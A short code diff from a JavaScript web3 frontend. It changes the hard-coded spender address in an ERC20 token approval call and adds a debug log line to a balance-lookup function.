@@ -49,7 +49,7 @@ const increaseAllowance = async (contractAddress, allowance) => {
       abi: Erc20Abi,
       functionName: "approve",
       args: [
-        "0x80EeF47fAb3b35726eBE01922969224EEC8B393E",
+        "0xD745A139eDb02c0c9eC4ce523a8c87D9f4d109E0",
         parseEther(allowance),
       ],
     });
@@ -62,6 +62,7 @@ const increaseAllowance = async (contractAddress, allowance) => {
 const getAccountBalance = async (_address) => {
   try {
     const balance = await getBalance(wagmiConfig, { _address });
+    console.log("this is balance from the function:", balance)
     return balance;
   } catch (error) {
     console.error("Failed to get balance: ", error);
